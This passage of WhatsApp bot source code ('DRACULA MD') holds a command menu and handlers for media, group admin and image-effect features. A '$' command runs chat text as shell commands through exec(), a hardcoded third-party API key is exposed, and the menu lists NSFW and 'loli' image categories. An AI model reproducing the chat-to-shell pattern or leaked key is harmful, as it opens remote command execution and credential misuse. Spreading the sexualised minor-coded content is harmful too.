➣ 𝔦𝔫𝔰𝔱𝔞𝔤𝔯𝔞𝔪
➣ 𝔱𝔦𝔨𝔱𝔬𝔨
➣ 𝔪𝔢𝔡𝔦𝔞𝔣𝔦𝔯𝔢
➣ 𝔤𝔡𝔯𝔦𝔳𝔢

𝔄𝔦:
➣ 𝔊𝔢𝔪𝔦𝔫𝔦
➣ 𝔊𝔢𝔪𝔦𝔫𝔦-𝔓𝔯𝔬

𝔖𝔱𝔦𝔠𝔨𝔢𝔯:
➣ 𝔰𝔱𝔦𝔠𝔨𝔢𝔯
➣ 𝔢𝔪𝔬𝔧𝔦𝔪𝔦𝔵
➣ 𝔰𝔪𝔢𝔪𝔢

𝔉𝔲𝔫:
➣ 𝔞𝔯𝔢𝔞𝔠𝔱
➣ 𝔰𝔬𝔲𝔫𝔡𝔰 𝔣𝔯𝔬𝔪 𝔬𝔫𝔢 𝔱𝔬 𝔬𝔫𝔢-𝔥𝔲𝔫𝔡𝔯𝔢𝔡
➣ 𝔯𝔬𝔠𝔨/𝔭𝔞𝔭𝔢𝔯/𝔰𝔠𝔦𝔰𝔰𝔬𝔯𝔰

𝔇𝔬𝔬𝔩𝔰:
➣ 𝔱𝔬𝔲𝔯𝔩
➣ 𝔰𝔰𝔴𝔢𝔟
➣ 𝔤𝔬𝔬𝔤𝔩𝔢
➣ 𝔖𝔥𝔬𝔯𝔱𝔢𝔫
➢ 𝔫𝔬𝔟𝔤
➢ 𝔤𝔦𝔪𝔞𝔤𝔢
➢ 𝔭𝔦𝔫𝔱𝔢𝔯𝔢𝔰𝔱
➢ 𝔤𝔦𝔱𝔰𝔱𝔞𝔩𝔨
➢ 𝔢𝔩𝔢𝔪𝔢𝔫𝔱𝔰

𝔈𝔭𝔥𝔬𝔱𝔬:
➢ 𝔤𝔩𝔦𝔱𝔠𝔥𝔱𝔢𝔵𝔱
➢ 𝔴𝔯𝔦𝔱𝔢𝔱𝔢𝔵𝔱
➢ 𝔞𝔡𝔳𝔞𝔫𝔠𝔢𝔡𝔤𝔩𝔬𝔴
➢ 𝔱𝔶𝔭𝔬𝔤𝔯𝔞𝔭𝔥𝔶𝔱𝔢𝔵𝔱
➢ 𝔭𝔦𝔵𝔢𝔩𝔤𝔩𝔦𝔱𝔠𝔥
➢ 𝔫𝔢𝔬𝔫𝔤𝔩𝔦𝔱𝔠𝔥
➢ 𝔣𝔩𝔞𝔤𝔱𝔢𝔵𝔱
➢ 𝔣𝔩𝔞𝔤3𝔡𝔱𝔢𝔵𝔱
➢ 𝔡𝔢𝔩𝔢𝔱𝔦𝔫𝔤𝔱𝔢𝔵𝔱
➢ 𝔟𝔩𝔞𝔠𝔨𝔭𝔦𝔫𝔨𝔰𝔱𝔶𝔩𝔢
➢ 𝔤𝔩𝔬𝔴𝔦𝔫𝔤𝔱𝔢𝔵𝔱
➢ 𝔲𝔫𝔡𝔢𝔯𝔴𝔞𝔱𝔢𝔯𝔱𝔢𝔵𝔱
➢ 𝔩𝔬𝔤𝔬𝔪𝔞𝔨𝔢𝔯
➢ 𝔠𝔞𝔯𝔱𝔬𝔬𝔫𝔰𝔱𝔶𝔩𝔢
➢ 𝔭𝔞𝔭𝔢𝔯𝔠𝔲𝔱𝔰𝔱𝔶𝔩𝔢
➢ 𝔴𝔞𝔱𝔢𝔯𝔠𝔬𝔩𝔬𝔯𝔱𝔢𝔵𝔱
➢ 𝔢𝔣𝔣𝔢𝔠𝔱𝔠𝔩𝔬𝔲𝔡𝔰
➢ 𝔟𝔩𝔞𝔠𝔨𝔭𝔦𝔫𝔨𝔩𝔬𝔤𝔬
➢ 𝔤𝔯𝔞𝔡𝔦𝔢𝔫𝔱𝔱𝔢𝔵𝔱
➢ 𝔰𝔲𝔪𝔪𝔢𝔯𝔟𝔢𝔞𝔠𝔥
➢ 𝔩𝔲𝔵𝔲𝔯𝔶𝔤𝔬𝔩𝔡
➢ 𝔪𝔲𝔩𝔱𝔦𝔠𝔬𝔩𝔬𝔯𝔢𝔡𝔫𝔢𝔬𝔫
➢ 𝔰𝔞𝔫𝔡𝔰𝔲𝔪𝔪𝔢𝔯
➢ 𝔤𝔞𝔩𝔞𝔵𝔶𝔴𝔞𝔩𝔩𝔭𝔞𝔭𝔢𝔯
➢ 1917𝔰𝔱𝔶𝔩𝔢
➢ 𝔪𝔞𝔨𝔦𝔫𝔤𝔫𝔢𝔬𝔫
➢ 𝔯𝔬𝔶𝔞𝔩𝔱𝔢𝔵𝔱
➢ 𝔣𝔯𝔢𝔢𝔠𝔯𝔢𝔞𝔱𝔢
➢ 𝔤𝔞𝔩𝔞𝔵𝔶𝔰𝔱𝔶𝔩𝔢
➢ 𝔩𝔦𝔤𝔥𝔱𝔢𝔣𝔣𝔢𝔠𝔱𝔰

𝔑𝔖𝔉𝔚:
➢ 𝔫𝔰𝔣𝔴
➢ 𝔱𝔯𝔞𝔭
➢ 𝔥𝔫𝔢𝔨𝔬
➢ 𝔫𝔴𝔞𝔦𝔣𝔲
➢ 𝔞𝔫𝔦𝔪𝔢𝔰𝔭𝔞𝔫𝔨
➢ 𝔰𝔭𝔞𝔫𝔨
➢ 𝔤𝔦𝔣𝔟𝔩𝔬𝔴𝔧𝔬𝔟
➢ 𝔟𝔩𝔬𝔴𝔧𝔬𝔟
➢ 𝔠𝔲𝔠𝔨𝔬𝔩𝔡
➢ 𝔢𝔟𝔞
➢ 𝔭𝔲𝔰𝔰𝔶
➢ 𝔶𝔲𝔯𝔦
➢ 𝔷𝔢𝔱𝔱𝔞𝔦
➢ 𝔥𝔢𝔫𝔱𝔞𝔳𝔦𝔡
➢ 𝔭𝔞𝔭𝔱𝔱

𝔄𝔫𝔦𝔪𝔢:
➢ 𝔱𝔵𝔱2𝔦𝔪𝔤
➢ 𝔯𝔞𝔫𝔡𝔬𝔪𝔞𝔫𝔦𝔪𝔢
➢ 𝔩𝔬𝔩𝔦
➢ 𝔠𝔬𝔰𝔭𝔩𝔞𝔶
➢ 𝔪𝔦𝔩𝔣
➢ 𝔴𝔞𝔩𝔩𝔪𝔩
➢ 𝔭𝔭𝔠𝔭

𝔅𝔲𝔤𝔰:
➢ 𝔰𝔭𝔢𝔠𝔱𝔯𝔢
➢ 𝔡𝔯𝔞𝔠
➢ 𝔲𝔦-𝔣𝔯𝔢𝔢𝔢𝔢
➢ 𝔩𝔬𝔯𝔡

𝔖𝔢𝔱𝔱𝔦𝔫𝔤𝔰:
➢ 𝔯𝔢𝔰𝔱𝔞𝔯𝔱
➢ 𝔞𝔲𝔱𝔬𝔟𝔦𝔬
➢ 𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔲𝔫𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔩𝔦𝔰𝔱𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔞𝔡𝔡𝔢𝔯𝔯𝔬𝔯
➢ 𝔡𝔢𝔩𝔢𝔯𝔯𝔬𝔯
➢ 𝔩𝔦𝔰𝔱𝔢𝔯𝔯𝔬𝔯
➢ 𝔠𝔩𝔢𝔞𝔯𝔰𝔢𝔰𝔰𝔦𝔬𝔫

𝔒𝔴𝔫𝔢𝔯:
➢ 𝔞𝔷𝔞
➢ 𝔯𝔢𝔭𝔬𝔯𝔱𝔟𝔲𝔤
➢ 𝔞𝔲𝔱𝔬𝔱𝔶𝔭𝔢
➢ 𝔞𝔫𝔱𝔦𝔠𝔞𝔩𝔩
➢ 𝔞𝔡𝔡𝔬𝔴𝔫𝔢𝔯
➢ 𝔟𝔩𝔬𝔠𝔨
➢ 𝔲𝔫𝔟𝔩𝔬𝔠𝔨
➢ 𝔠𝔩𝔢𝔞𝔯𝔞𝔩𝔩𝔟𝔩𝔬𝔠𝔨
➢ 𝔅𝔩𝔬𝔠𝔨𝔩𝔦𝔰𝔱
➢ 𝔒𝔫𝔩𝔦𝔫𝔢𝔩𝔦𝔰𝔱
➢ 𝔟𝔠𝔤𝔠
➢ 𝔍𝔬𝔦𝔫
➢ 𝔒𝔲𝔱
➢ 𝔓𝔲𝔟𝔩𝔦𝔠
➢ 𝔖𝔢𝔩𝔣
➢ $       
        `;

 // Load and send video
        const videoUrl = 'https://raw.githubusercontent.com/DRACULAFX/Video/main/video1.mp4';
        const videoResponse = await axios.get(videoUrl, { responseType: 'arraybuffer' });
        const video = videoResponse.data;

        await conn.sendMessage(from, {
            video: video,
            caption: menu,
            mimetype: 'video/mp4',
        });
        console.log("Video sent successfully.");

        console.log("Loading audio...");
        // Load and send audio
        const audioUrl = 'https://raw.githubusercontent.com/DRACULAFX/Video/main/menu.mp3';
        const audioResponse = await axios.get(audioUrl, { responseType: 'arraybuffer' });
        const audio = audioResponse.data;

        await conn.sendMessage(from, {
            audio: audio,
            mimetype: 'audio/mp4', // Correct MIME type
            ptt: true,
        });
        console.log("Audio sent successfully.");
    } catch (error) {
        console.error("Error in sending message:", error);
        m.reply("An error occurred while processing your request. Please try again.");
    }
    break;
}




case 'tts':
    if (!q) reply(`𝕌𝕤𝕖 𝔼𝕩𝕒𝕞𝕡𝕝𝕖 ${prefix}${command} 𝔸𝕣𝕒 𝕒𝕣𝕒`);
    
    const gtts = require('node-gtts');

    function tts(text, lang = 'en') {
        return new Promise((resolve, reject) => {
            try {
                let tts = gtts(lang);
                let filePath = (1 * new Date()) + '.mp3';
                tts.save(filePath, text, () => {
                    resolve(fs.readFileSync(filePath));
                    fs.unlinkSync(filePath);
                });
            } catch (e) { 
                reject(e); 
            }
        });
    }

    const defaultLang = 'en';
    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    // Always set text from quoted message if not provided
    if (!text) text = m.quoted?.text || '';

    let ras;
    try { 
        ras = await tts(text, lang); 
    } catch (e) {
        reply(`𝔼𝕣𝕣𝕠𝕣: ${e}`);
        text = args.join(' ');
        ras = await tts(text, defaultLang);
    } finally {
        if (ras) conn.sendMedia(from, ras, m, {caption: `𝕊𝕦𝕔𝕔𝕖𝕤𝕤!`});
    }
break;

case 'mbeast':
    if (!q) return reply(`𝕌𝕤𝕖 𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix}${command} DRACULA IS KING`);
 
 await loading();
    

    async function fetchBeastTTS(query) {
        try {
            const apiUrl = `https://bk9.fun/tools/tts-beast?q=${encodeURIComponent(query)}`;
            const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });

            // Save audio data to a file
            const fileName = `tts_audio_${Date.now()}.mp3`;
            fs.writeFileSync(fileName, response.data);

            return fileName; // Return the saved file name
        } catch (error) {
            throw new Error('Failed to fetch TTS');
        }
    }

    try {
        const audioFileName = await fetchBeastTTS(q);

        // Send the saved audio as a WhatsApp audio message
        conn.sendMessage(from, { audio: fs.readFileSync(audioFileName), mimetype: 'audio/mpeg' }, { quoted: m });

        // Clean up the file after sending
        fs.unlinkSync(audioFileName);
    } catch (e) {
        reply(`𝔼𝕣𝕣𝕠𝕣: ${e.message}`);
    }
break;







case 'ss':
case 'ssweb': {
    if (!q) return reply("✏️ *𝓟𝓵𝓮𝓪𝓼𝓮 𝓮𝓷𝓽𝓮𝓻 𝓪 𝓵𝓲𝓷𝓴.*\n\n𝓔𝓧𝓐𝓶𝓹𝓵𝓮: `https://www.example.com`");
    if (!isUrl(args[0]) && !args[0].includes('www.')) return reply("⚠️ *𝓘𝓷𝓿𝓪𝓵𝓲𝓭 𝓵𝓲𝓷𝓴!*\n\n𝓜𝓪𝓴𝓮 𝓼𝓾𝓻𝓮 𝓎𝓸𝓾𝓻 𝓵𝓲𝓷𝓴 𝓲𝓼 𝓬𝓸𝓻𝓻𝓮𝓬𝓽 𝓪𝓷𝓭 𝓲𝓷𝓬𝓁𝓾𝓭𝓮 'www.' 𝓸𝓻 𝓼𝓽𝓪𝓻𝓽𝓼 𝓲𝓽𝓱 'http://' 𝓸𝓻 'https://'.");
    await loading();
    let Url = `https://api.apiflash.com/v1/urltoimage?access_key=185eff3aa9fe4e3c8e30bda63b1fb9cf&wait_until=page_loaded&url=${q}`;
    
    conn.sendMessage(from, { 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true, 
                title: `${botName}`, 
                mediaType: 3, 
                renderLargerThumbnail: false,
                thumbnail: thumb,
                sourceUrl: `https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K`
            }
        }, 
        image: { url: Url }, 
        caption: `✅ *𝒮𝒸𝓇𝑒𝑒𝓃𝒽𝑜𝓉 𝒸𝒶𝓅𝓉𝓾𝓇𝑒𝒹 𝓈𝓊𝒸𝒸𝑒𝓈𝓈𝒻𝓊𝓁𝓁𝓎!*`,
    }, { quoted: m })
    .catch((err) => reply("⚠️ *𝒮𝑒𝓇𝓋𝑒𝓇 𝑒𝓇𝓇𝑜𝓇!*\n\n𝒫𝓁𝑒𝒶𝓈𝑒 𝓉𝓇𝓎 𝒶𝑔𝒶𝒾𝓃 𝓁𝒶𝓉𝑒𝓇."));
}
break;

case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await reply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return reply(`${copyright}:~ ${err}`)
if (stdout) {
await reply(`*>_ Console*\n\n${stdout}`)
}
})
}
break

case 'aza': {

    await loading();

    setReply(`
𝔸ℂℂ𝕆𝕌ℕ𝕋 ℕ𝕌𝕄𝔹𝔼ℝ:
📇 ${accno}

𝔸ℂℂ𝕆𝕌ℕ𝕋 ℕ𝔸𝕄𝔼:
👤 ${accname}

𝔹𝔸ℕ𝕂 ℕ𝔸𝕄𝔼:
🏦 ${bankname}`);
}
break;

case 'panels': {

    await loading();

    setReply(`
𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐏𝐀𝐍𝐄𝐋 𝐎𝐅𝐅𝐄𝐑𝐒  
━━━━━━━━━━━━━━━━━━━━━━━  
🔥 *1𝐆𝐁*     ➤   𝟓𝟎𝟎  
🔥 *2𝐆𝐁*     ➤   𝟏𝟎𝟎𝟎  
🔥 *3𝐆𝐁*     ➤   𝟏𝟓𝟎𝟎  
🔥 *4𝐆𝐁*     ➤   𝟐𝟎𝟎𝟎  
🔥 *5𝐆𝐁*     ➤   𝟐𝟓𝟎𝟎  
🔥 *6𝐆𝐁*     ➤   𝟑𝟎𝟎𝟎  
🔥 *7𝐆𝐁*     ➤   𝟑𝟓𝟎𝟎  
🔥 *8𝐆𝐁*     ➤   𝟒𝟎𝟎𝟎  
🔥 *9𝐆𝐁*     ➤   𝟒𝟓𝟎𝟎  
🔥 *10𝐆𝐁*   ➤   𝟓𝟎𝟎𝟎  
🔥 *𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃* ➤   𝟕𝟎𝟎𝟎  
━━━━━━━━━━━━━━━━━━━━━━━  

💰 *𝐁𝐮𝐲 𝐍𝐨𝐰 𝐅𝐫𝐨𝐦: 𝐃𝐫𝐚𝐜𝐮𝐥𝐚 𝐟𝐱*  
📞 *𝐂𝐨𝐧𝐭𝐚𝐜𝐭:* +𝟐𝟑𝟒𝟗𝟎𝟔𝟎𝟖𝟓𝟑𝟏𝟖𝟗  
💬 *𝐃𝐌 𝐟𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐞 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐏𝐚𝐧𝐞𝐥𝐬!*  

━━━━━━━━━━━━━━━━━━━━━━━  
💡 *𝐒𝐞𝐜𝐮𝐫𝐞 | 𝐅𝐚𝐬𝐭 | 𝐑𝐞𝐥𝐢𝐚𝐛𝐥𝐞*`);
}
break;



  case 'listcase': {
  await loading();
    const listCase = () => {
        const code = fs.readFileSync("./message/case.js", "utf8");
        var regex = /case\s+'([^']+)':/g;
        var matches = [];
        var match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `*Total Case*: ${matches.length} \n\n`;
        matches.forEach(function (x) {
            teks += "☞ " + x + "\n"; // Added space after "☞"
        });
        teks += "\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳";
        return teks;
    };
    setReply(listCase());
}
break;





case 'onlinelist': {
    if (!isGroup) return onlyGroup()
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
    let online = [...Object.keys(store.presences[id]), botNumber]
    conn.sendText(from, '💻 *𝒜𝒸𝓉𝒾𝓋𝑒 𝒲𝓈𝑒𝓇𝓈* 🟢\n\n' + 
                      online.map(v => '🔹 @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break


case 'blocklist': {
await loading();
    let block = await conn.fetchBlocklist()            
    setReply('🚫 *𝓑𝓁𝓸𝓬𝓴𝓮𝓭 𝒲𝓈𝑒𝓇𝓈* 🔒\n\n' + 
              `Total: ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + 
              block.map(v => '🔒 @' + v.replace(/@.+/, '')).join`\n`)
}
break


case 'jid': {
    setReply(`📧 *JID Information* 🆔\n\n${from}`)
}
break




case 'gitstalk': {
    if (!q) return reply("✏️ *𝓟𝓵𝓮𝓪𝓼𝓮 𝓮𝓷𝓽𝓮𝓻 𝓪 𝓖𝓲𝓽𝓗𝓾𝓫 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.*\n\n𝓔𝓧𝓐𝓶𝓹𝓵𝓮: `gitstalk octocat`");
    await loading();
    let Url = `https://api.popcat.xyz/github/${q}`;

    fetch(Url)
        .then(res => res.json())
        .then(data => {
            if (data.error) return reply("⚠️ *𝓤𝓼𝓮𝓻 𝓷𝓸𝓽 𝓯𝓸𝓾𝓷𝓭!*\n\n𝓜𝓪𝓴𝓮 𝓼𝓾𝓻𝓮 𝓽𝓱𝓮 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 𝓲𝓼 𝓬𝓸𝓻𝓻𝓮𝓬𝓽.");

            let caption = `
✅ *𝒢𝒾𝓉𝐻𝓊𝒷 𝒰𝓈𝑒𝓇 𝒮𝓉𝒶𝓁𝓀𝑒𝒹 𝒮𝓊𝒸𝒸𝑒𝓈𝓈𝒻𝓊𝓁𝓁𝓎!*

👤 *𝙽𝙰𝙼𝙴:* ${data.name || 'N/A'}
📂 *𝙱𝙸𝙾:* ${data.bio || 'N/A'}
🔗 *𝙻𝙸𝙽𝙺:* ${data.url}
📅 *𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙰𝚃:* ${data.created_at}
⭐ *𝙿𝚄𝙱𝙻𝙸𝙲 𝚁𝙴𝙿𝙾𝚂:* ${data.public_repos}
👥 *𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:* ${data.followers}
👤 *𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶:* ${data.following}
            `;
            
            conn.sendMessage(from, { 
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `${botName}`, 
                        mediaType: 3, 
                        renderLargerThumbnail: false,
                        thumbnail: thumb,
                        sourceUrl: `https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K`
                    }
                },
                image: { url: data.avatar }, 
                caption: caption,
            }, { quoted: m });
        })
        .catch((err) => reply("⚠️ *𝒮𝑒𝓇𝓋𝑒𝓇 𝑒𝓇𝓇𝑜𝓇!*\n\n𝒫𝓁𝑒𝒶𝓈𝑒 𝓉𝓇𝓎 𝒶𝑔𝒶𝒾𝓃 𝓁𝒶𝓉𝑒𝓇."));
}
break;



case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects': {
    if (!q) return reply(`Example: ${prefix + command} Dracula`)
    await loading()
    let link
    if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
    if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
    if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
    if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
    if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
    if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
    if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
    if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
    if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
    if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
    if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
    if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
    if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
    if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
    if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
    if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
    if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
    if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
    if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
    if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
    if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
    if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
    if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
    if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
    if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
    if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
    if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
    if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
    if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
    if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
    let haldwhd = await ephoto(link, q)
    conn.sendMessage(m.chat, { image: { url: haldwhd }, caption: `> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳` }, { quoted: m })
    db.data.users[sender].limit -= 1
}
break

case 'del': {
    // Remove group-only requirement
    if (!isGroupAdmins && !isOwner) return reply("⫸ Only admins or the owner can use this command ⫷");

    // Check if the command is replying to a message
    if (!mentionByReply) return reply("⫸ Please reply to a message to delete it ⫷");

    try {
        // Perform delete operation
        if (mentionByReply == botNumber) {
            await conn.sendMessage(from, { 
                delete: { 
                    remoteJid: from, 
                    fromMe: true, 
                    id: m.quoted.id, 
                    participant: mentionByReply 
                } 
            });
        } else if (mentionByReply !== botNumber && isBotGroupAdmins) {
            await conn.sendMessage(from, { 
                delete: { 
                    remoteJid: from, 
                    fromMe: false, 
                    id: m.quoted.id, 
                    participant: mentionByReply 
                } 
            });
        }

        // If the delete operation succeeds, delete the command message
        await conn.sendMessage(from, { 
            delete: { 
                remoteJid: from, 
                fromMe: true, 
                id: m.id, 
                participant: sender 
            } 
        });
    } catch (error) {
        // Handle failure of delete operation
        reply("⫸ Failed to delete the message. Please try again ⫷");
        console.error("Delete operation failed:", error);
    }
}
break;



case 'restart': {
    if (!isOwner && !itsMe) return onlyOwner()
    let bot = db.data.others['restart']
    if (bot) {
        db.data.others['restart'].m = m
        db.data.others['restart'].from = from
    } else {
        db.data.others['restart'] = {
            m: m,
            from: from
        }
    }
    await conn.sendMessage(from, { text: `𝔹𝕠𝕥 𝕣𝕖𝕤𝕥𝕒𝕣𝕥𝕚𝕟𝕘...` }) // Double-struck message
    await conn.sendMessage(from, { text: `𝕊𝕦𝕔𝕔𝕖𝕤𝕤!` }) // Double-struck success
    await sleep(1000)
    process.send('reset')
}
break

case 'hidetag':
if (!isGroup) return onlyGroup()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'tagall': {
    if (!isGroup) return onlyGroup();
    if (!isGroupAdmins && !isBotGroupAdmins) return onlyBadmin();
    

    let inpo = q ? q : `${gris}𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝚂𝚄𝙼` + readmore + `𝙼𝙾𝙽𝚂 𝙴𝚅𝙴𝚁𝚈𝙾𝙽𝙴${gris}`;
    let members_id = [];
    let tes = '\n';

    await groupMembers.map(i => {
        tes += `🥶 @${i.id.split('@')[0]}\n`;
        members_id.push(i.id);
    });

    // Append indented quote at the end
    tes += `\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳`;

    // Use reply to send the message with mentions
    return reply(`${inpo}\n${tes}`, false, {
        mentions: members_id
    });
}
break;

case 'promote': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    let user = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await conn.groupParticipantsUpdate(m.chat, [user], 'promote');
    reply(`𝔸𝕔𝕥𝕚𝕠𝕟 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝!`);
}
break;

case 'demote': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    let user = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await conn.groupParticipantsUpdate(m.chat, [user], 'demote');
    reply(`𝔸𝕔𝕥𝕚𝕠𝕟 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝!`);
}
break;


case 'akira': case 'akiyama': case 'anna': case 'asuna': case 'ayuzawa': case 'boruto': case 'chitanda': case 'chitoge': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'asuna': case 'erza': case 'gremory': case 'hestia': case 'hinata': case 'inori': case 'itachi': case 'isuzu': case 'itori': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kaneki': case 'kosaki': case 'kotori': case 'kuriyama': case 'kuroha': case 'kurumi': case 'madara': case 'mikasa': case 'miku': case 'minato': case 'naruto': case 'natsukawa': case 'nekohime': case 'nezuko': case 'nishimiya': case 'onepiece': case 'pokemon': case 'rem': case 'rize': case 'sagiri': case 'sakura': case 'sasuke': case 'shina': case 'shinka': case 'shizuka': case 'shota': case 'tomori': case 'toukachan': case 'tsunade': case 'yatogami': case 'yuki':{
if (!isGroup) return onlyGroup()
let res = await (await fetch(`https://raw.githubusercontent.com/KazukoGans/database/main/anime/${command}.json`)).json()
let cita = res[Math.floor(Math.random() * res.length)]
await conn.sendFile(m.chat, cita, 'image.jpg', `_${command}_`, m)

}
break

case 'loli': 
case 'cosplay': 
case 'husbu': 
case 'milf': 
case 'wallml': {


    m.reply("⏳ *Fetching your request...*");

    try {
        let response = await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`);
        let data = response.data;
        let randomImage = data[Math.floor(Math.random() * data.length)];
        let imageBuffer = await getBuffer(randomImage);

        conn.sendMessage(
            from, 
            { 
                contextInfo: { 
                    externalAdReply: { 
                        showAdAttribution: true, 
                        title: wm, 
                        mediaType: 3, 
                        renderLargerThumbnail: true, 
                        thumbnail: thumb, 
                        sourceUrl: `https://wa.me/${nomerOwner}`
                    } 
                }, 
                image: imageBuffer, 
                caption: `✨ _*${command.toUpperCase()}*_ ✨\n\n💖 *Enjoy your image!*`, 
                footer: `🔍 *Result from ${command} search*`
            }, 
            { quoted: m }
        );
    } catch (err) {
        reply("❌ *Server error! Please try again later.*");
    }
}
break;


case 'ppcp': case 'couplepp': {
    
    await m.reply("⏳ *Fetching a random couple profile picture...*");
    
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json');
        let random = anu[Math.floor(Math.random() * anu.length)];

        // Sending Male Picture
        conn.sendMessage(m.chat, 
            { 
                image: { url: random.male }, 
                caption: `👦 *Couple Male*\n\n✨ *Perfect for your profile!*`
            }, 
            { quoted: m }
        );

        // Sending Female Picture
